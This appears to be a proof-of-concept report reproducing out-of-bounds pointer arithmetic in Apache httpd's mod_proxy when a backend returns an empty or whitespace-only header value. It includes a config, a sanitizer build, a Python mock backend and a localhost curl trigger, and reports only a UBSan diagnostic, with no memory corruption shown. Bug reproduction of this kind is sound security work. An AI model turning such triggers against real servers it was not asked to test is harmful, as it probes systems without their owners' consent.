# PoC 076 - Out-Of-Bounds Pointer On Empty Backend Header

`ap_proxy_read_headers()` computes `&value[strlen(value)-1]` for empty header
values, forming a pointer one byte before the value buffer. Undefined per the C
standard; UBSan flags it.

## Setup

`httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

ErrorLog logs/error_log
LogLevel debug

ProxyPass        /back/ http://127.0.0.1:9090/
ProxyPassReverse /back/ http://127.0.0.1:9090/
```

Build httpd with sanitizer flags so the UB is visible:

```bash
CFLAGS="-O1 -g -fsanitize=undefined,address" \
LDFLAGS="-fsanitize=undefined,address" \
./configure --enable-proxy --enable-proxy-http
make
```

Mock backend that emits an empty header value (`tmp/empty_header_backend.py`):

```python
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 9090)); s.listen(4)
while True:
    c, _ = s.accept()
    c.recv(8192)
    c.sendall(b"HTTP/1.1 200 OK\r\n"
              b"Content-Length: 0\r\n"
              b"X-Empty:\r\n"          # empty value, hits the bug
              b"\r\n")
    c.close()
```

## Trigger

```bash
python3 tmp/empty_header_backend.py &
./httpd -X -f conf/httpd.conf &
curl -i http://127.0.0.1:8080/back/
```

## Observed effect

UBSan prints to httpd's stderr (or `error_log` with `ErrorLog "|cat"`):

```text
modules/proxy/mod_proxy_http.c:922:31: runtime error:
  addition of unsigned offset to 0x... overflowed to 0x... 
  (pointer index -1 of object size 1 'char [1]')
SUMMARY: UndefinedBehaviorSanitizer: pointer-overflow
```

The HTTP exchange still completes with `200 OK` because the `for` loop's
`end > value` check stops dereferencing, but the pointer arithmetic itself is
already undefined behaviour, observable on hardened builds (CFI, MTE) or under
strict compilers.

## Log marker

`error_log` contains the UBSan diagnostic line cited above. On unsanitized
builds the bug is silent; reproduce with the sanitizer build to confirm.

## Variants

The same path is exercised by whitespace-only values (e.g. `X-Foo: \r\n`)
because leading-whitespace skipping reduces them to an empty value before
trailing-whitespace trimming runs.
